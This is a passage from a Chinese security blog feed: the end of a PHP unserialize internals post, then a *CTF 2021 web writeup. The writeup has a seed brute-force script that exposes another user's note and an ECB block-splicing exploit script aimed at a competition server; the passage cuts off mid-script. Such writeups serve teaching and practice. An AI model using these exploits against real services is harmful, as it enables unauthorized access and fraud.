class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;r:&quot;</span> uiv <span class="string">&quot;;&quot;</span>        &#123;</span><br><span class="line">    zend_long id;</span><br><span class="line">    *p = YYCURSOR;</span><br><span class="line">    <span class="keyword">if</span> (!var_hash) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    id = <span class="built_in">parse_uiv</span>(start + <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = <span class="built_in">var_access</span>(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// 待会说 var_hash ，先看下面几行</span></span><br><span class="line">    <span class="comment">// r begin</span></span><br><span class="line">    <span class="keyword">if</span> (rval_ref == rval) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="built_in">ZVAL_DEREF</span>(rval_ref);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Z_TYPE_P</span>(rval_ref) != IS_OBJECT) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// r end</span></span><br><span class="line">    <span class="built_in">ZVAL_COPY</span>(rval, rval_ref);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而对于“对象引用”，其反序列化过程与上面小r非常像，不一样的地方在于 r begin 和 r end 之间：</p><p>php并没有对取出的引用进行解引用，直接将这个 <em><strong>引用</strong></em> 赋给了右值。<br>如果取出的引用本身指向的是一个引用，php还会进一步跟到引用指向的对象，创建一个新的指向对应对象的引用，赋给右值。<br>我觉得这一步可以起名叫ref flattening。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 略</span></span><br><span class="line"><span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = <span class="built_in">var_access</span>(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="comment">// R begin</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Z_ISUNDEF_P</span>(rval_ref) || (<span class="built_in">Z_ISREF_P</span>(rval_ref) &amp;&amp; <span class="built_in">Z_ISUNDEF_P</span>(<span class="built_in">Z_REFVAL_P</span>(rval_ref)))) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Z_ISREF_P</span>(rval_ref)) &#123;</span><br><span class="line">    zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((*var_hash)-&gt;ref_props) &#123;</span><br><span class="line">        info = <span class="built_in">zend_hash_index_find_ptr</span>((*var_hash)-&gt;ref_props, (<span class="type">zend_uintptr_t</span>)rval_ref);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZVAL_NEW_REF</span>(rval_ref, rval_ref);</span><br><span class="line">    <span class="keyword">if</span> (info) &#123; <span class="built_in">ZEND_REF_ADD_TYPE_SOURCE</span>(<span class="built_in">Z_REF_P</span>(rval_ref), info); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// R end</span></span><br><span class="line"><span class="built_in">ZVAL_COPY</span>(rval, rval_ref);</span><br></pre></td></tr></table></figure><h3 id="数字">数字</h3><p>那么，R/r后面跟的数字是怎么决定的呢？首先我们先来“黑箱分析”一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// e.g 1</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">stdClass</span>);</span><br><span class="line"><span class="variable">$x</span>[<span class="number">1</span>] = &amp;<span class="variable">$x</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;R:2;&#125;               ⬇️ 注意这，变了</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;R:1;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">/* 压缩了一下（</span></span><br><span class="line"><span class="comment">array(2) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt; object(stdClass)#2 (0) &#123;&#125;</span></span><br><span class="line"><span class="comment">  [1]=&gt; array(2) &#123;</span></span><br><span class="line"><span class="comment">    [0]=&gt; object(stdClass)#2 (0) &#123;&#125;</span></span><br><span class="line"><span class="comment">    [1]=&gt; *RECURSION*</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// e.g 2</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;b = &amp;<span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;&#125;               ⬇️ 同上</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:1;&#125; &#x27;</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(stdClass)#3 (2) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;a&quot;]=&gt; int(1)</span></span><br><span class="line"><span class="comment">  [&quot;b&quot;]=&gt; *RECURSION*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>相信大家定睛看两眼上面的例子就能猜出，R/r后面的数字指代的是在 <em><strong>同一反序列化过程中</strong></em><br>出现过的第n个非键(key)对象（我又在瞎起名字了）</p><p>看过上面的源码以后很容易猜到，在反序列化过程中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = <span class="built_in">var_access</span>(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>这一步正是上面取值的关键。在反序列化过程中我们看到 <code>php_var_unserialize_internal</code> 函数在一开头就进行了 <code>var_push(var_hash, rval);</code> 这样的操作（当然前提是反序列化的对象的标记不能是’R’，因为“引用”本身如果也计算在内，那么就有可能出现循环引用。浙恒河里），而 <code>var_push</code> 正是向列表 <code>var_hash</code> append一个新的元素。</p><blockquote><p>其实 <code>var_hash</code> 并不单单是一个列表，只是本文为方便这么说罢了。</p></blockquote><p><em><strong>此处小重点</strong></em></p><p>这时候就有同学要问了，数组的index是数字，对象的属性名是字符串，它们都存在于反序列化过程当中，为什么它们没有被append进 <code>var_hash</code> 呢？我们回头看一下 <code>var_push</code> 的条件：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var_hash &amp;&amp; (*p)[<span class="number">0</span>] != <span class="string">&#x27;R&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure><p>后面那个’R’已经在恒河里了，那么前面那个 <code>var_hash</code> 非 NULL 的判断意义何在呢？<br>桥豆麻袋，<code>var_hash</code> 是哪里来的呢？<br><code>php_var_unserialize_internal</code> 的参数里有个宏</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNSERIALIZE_PARAMETER \</span></span><br><span class="line"><span class="meta">    zval *rval, const unsigned char **p, \</span></span><br><span class="line"><span class="meta">    const unsigned char *max, \</span></span><br><span class="line"><span class="meta">    php_unserialize_data_t *var_hash</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">php_var_unserialize_internal</span><span class="params">(UNSERIALIZE_PARAMETER, <span class="type">int</span> as_key)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>任何看了源码的人看到这里都会&lt;龙门粗口&gt;，槽点实在是太多了</p></blockquote><p>自然而然地，我们回去看这个internal是怎么调用的，看看什么情况下传入的 <code>var_hash</code> 为 NULL：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 高度简化版</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">php_var_unserialize_internal</span><span class="params">(UNSERIALIZE_PARAMETER, <span class="type">int</span> as_key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> match <span class="string">&quot;a:&lt;arr_len&gt;&quot;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="built_in">process_nested_data</span>(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> match <span class="string">&quot;O:&lt;type&gt;:&lt;cnt_attrs&gt;&quot;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="built_in">object_common</span>(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title">object_common</span><span class="params">(UNSERIALIZE_PARAMETER, zend_long elements, zend_bool has_unserialize)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">process_nested_data</span>(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> zend_always_inline <span class="type">int</span> <span class="title">process_nested_data</span><span class="params">(UNSERIALIZE_PARAMETER, HashTable *ht, zend_long elements, zend_object *obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (elements-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        zval key, *data;</span><br><span class="line">        zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">php_var_unserialize_internal</span>(&amp;key, p, max, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// assert type(key) == string or type(key) == long</span></span><br><span class="line">        <span class="keyword">if</span> (obj) &#123;</span><br><span class="line">            <span class="comment">// assert string(key) in dir(obj)</span></span><br><span class="line">            <span class="comment">// obj[key] = new ref info // zend_get_typed_property_info_for_slot</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">php_var_unserialize_internal</span>(data, p, max, var_hash, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (info) &#123;</span><br><span class="line">            <span class="comment">// some checks</span></span><br><span class="line">            <span class="built_in">zend_ref_add_type_source</span>(<span class="built_in">Z_REF_P</span>(data), info);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 略</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当反序列化数组、对象这种东西的时候，只有反序列化 <em><strong>值</strong></em> 时会传入 <code>var_hash</code> 这个列表， <em><strong>键</strong></em> 并不存在于这个对象中的列表中。真相大白。</p><h2 id="有趣的事情">有趣的事情</h2><h3 id="1">1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">stdClass</span>);</span><br><span class="line"><span class="variable">$x</span>[<span class="number">1</span>] = &amp;<span class="variable">$x</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;a:2:&#123;i:0;r:2;i:1;R:3;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>这就是序列化部分的事情了。可是今天实在不想写了。</p><h3 id="2">2</h3><p>C++的引用实际上并不一定占用堆栈空间。对对象的解引用<a href="https://en.cppreference.com/w/cpp/language/reference#:~:text=they%20do%20not%20necessarily%20occupy%20storage">很有可能</a>是在编译期间完成的。</p><h2 id="求Star">求Star</h2><p>建议去点个star，<a href="https://github.com/frankli0324/libphpserialize"><img src="https://img.shields.io/github/stars/frankli0324/libphpserialize.svg?style=flat&label=秋梨膏" style="display:inherit"/></a>！！！</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近想起来 &lt;a href=&quot;https://github.com/frankli0324/libphpserialize&quot;&gt;libphpserialize&lt;/a&gt; 还有一个TODO，实现递归对象的序列化，顺手写写php序列化中&amp;quot;r&amp;qu</summary>
      
    
    
    
    
    <category term="php-src" scheme="https://blog.frankli.site/tags/php-src/"/>
    
  </entry>
  
  <entry>
    <title>*CTF 2021 Web部分 Writeup</title>
    <link href="https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/"/>
    <id>https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/</id>
    <published>2021-01-18T07:58:02.000Z</published>
    <updated>2025-10-19T20:31:14.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="oh-my-note">oh-my-note</h2><p>签到题，观察源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/create_note&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_note</span>():</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                timestamp = <span class="built_in">round</span>(time.time(), <span class="number">4</span>)</span><br><span class="line">                random.seed(timestamp)</span><br><span class="line">                user_id = get_random_id()</span><br><span class="line">                ...</span><br><span class="line">            timestamp = <span class="built_in">round</span>(time.time(), <span class="number">4</span>)</span><br><span class="line">            post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(<span class="string">&#x27;%Y-%m-%d %H:%M UTC&#x27;</span>)</span><br><span class="line">            random.seed(user_id + post_at)</span><br><span class="line">            note_id = get_random_id()</span><br><span class="line"></span><br><span class="line">            note = Note(user_id=user_id, note_id=note_id,</span><br><span class="line">                        title=title, text=text,</span><br><span class="line">                        prv=prv, post_at=post_at)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>不难发现可以根据文章发布的时间反推seed拿到对应用户的id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">ts = <span class="number">1610677740</span></span><br><span class="line">te = <span class="number">1610677800</span></span><br><span class="line">target = <span class="string">&#x27;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_id</span>():</span><br><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(ts, te):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9999</span>):</span><br><span class="line">        timestamp = <span class="number">0.0001</span> * i + t</span><br><span class="line">        random.seed(timestamp)</span><br><span class="line">        user = get_random_id()</span><br><span class="line">        time = datetime.datetime.fromtimestamp(</span><br><span class="line">            t, tz=datetime.timezone.utc</span><br><span class="line">        ).strftime(<span class="string">&#x27;%Y-%m-%d %H:%M UTC&#x27;</span>)</span><br><span class="line">        random.seed(user + time)</span><br><span class="line">        post = get_random_id()</span><br><span class="line">        <span class="keyword">if</span> post == target:</span><br><span class="line">            <span class="built_in">print</span>(timestamp, user)</span><br></pre></td></tr></table></figure><blockquote><p>然而比赛的时候作为一个星 际 人，发生了这样的事情：</p></blockquote><img src="/2021/01/18/Security/Writeup/*CTF-2021-Web/chat.png" class="" title="星 际"><p>而后<code>/my_notes</code>路由只要利用<code>user_id</code>就能列出用户的所有文章</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/my_notes&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_notes</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        user_id = User.query.filter_by(username=username).first().user_id</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user_id = request.args.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user_id:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure><p>看到flag所在文章</p><img src="/2021/01/18/Security/Writeup/*CTF-2021-Web/secret.png" class="" title="flag"><h2 id="lottery-again">lottery again</h2><p>题目是用的是ECB，cut and paste again。<br>经过尝试，题目所用加密方式块大小为32，将随意一个明文可以如下拆分：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;lottery&quot;</span><span class="punctuation">:</span><span class="string">&quot;cf4cfb25-8168-49db-a</span></span><br><span class="line"><span class="string">32f-4bf80e5bc785&quot;</span><span class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;b61740</span></span><br><span class="line"><span class="string">52-f23a-4dbf-937d-fed3288b8de3&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;coin&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>好像没什么下手的地方？这时注意到php处理array的一个特性：当有重复键值时，取后扫描到的键值的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>([<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到题目。这类题目一般的思路为：用很多账户购买lottery（或者直接伪造，当然这道题不行，因为要和数据库内的lottery id交叉比对），并用一个账户充值，购买flag。也就是说，加入我们现在有两个lottery，我们需要将其中一个lottery的user段替换成另一个lottery中的user。<br>结合php array特性，我们可以将</p><table><thead><tr><th style="text-align:left">Lottery 1</th><th style="text-align:left">Lottery 2</th></tr></thead><tbody><tr><td style="text-align:left">{“lottery”:“cf4cfb25-8168-49db-a<br>32f-4bf80e5bc785”,“user”:“aaaaaa<br>aa-aaaa-aaaa-aaaa-aaaaaaaaaaaa”,<br>“coin”:1}</td><td style="text-align:left">{“lottery”:“fbdcf544-07d3-422e-8<br>40b-d62a90c9332e”,“user”:“bbbbbb<br>bb-bbbb-bbbb-bbbb-bbbbbbbbbbbb”,<br>“coin”:2}</td></tr></tbody></table><p>Lottery 1的第三个块替换为Lottery 2的第二、第三块：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;lottery&quot;</span><span class="punctuation">:</span><span class="string">&quot;cf4cfb25-8168-49db-a</span></span><br><span class="line"><span class="string">32f-4bf80e5bc785&quot;</span><span class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaaaaa</span></span><br><span class="line"><span class="string">40b-d62a90c9332e&quot;</span><span class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;bbbbbb</span></span><br><span class="line"><span class="string">bb-bbbb-bbbb-bbbb-bbbbbbbbbbbb&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;coin&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>妙啊</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        完整exploit    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ses = session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_id</span>():</span><br><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>():</span><br><span class="line">    usernm, passwd = get_random_id(), get_random_id()</span><br><span class="line">    ses.post(<span class="string">&#x27;http://52.149.144.45:8080/user/register&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: usernm, <span class="string">&#x27;password&#x27;</span>: passwd,</span><br><span class="line">    &#125;).json()[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">    user = ses.post(<span class="string">&#x27;http://52.149.144.45:8080/user/login&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: usernm, <span class="string">&#x27;password&#x27;</span>: passwd,</span><br><span class="line">    &#125;).json()[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_user = get_user()</span><br><span class="line"><span class="built_in">print</span>(flag_user)</span><br><span class="line">price = ses.post(<span class="string">&#x27;http://52.149.144.45:8080/lottery/buy&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;api_token&#x27;</span>: flag_user[<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">&#125;).json()[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">amount = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> amount &lt; <span class="number">9999</span>:</span><br><span class="line">    fake_user = get_user()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        sheep = ses.post(<span class="string">&#x27;http://52.149.144.45:8080/lottery/buy&#x27;</span>, data=&#123;</span><br><span class="line">            <span class="string">&#x27;api_token&#x27;</span>: fake_user[<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">        &#125;).json()[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line">        treasure = b64decode(sheep)[:<span class="number">64</span>] + \</span><br><span class="line">            b64decode(price)[<span class="number">32</span>:<span class="number">96</span>] + 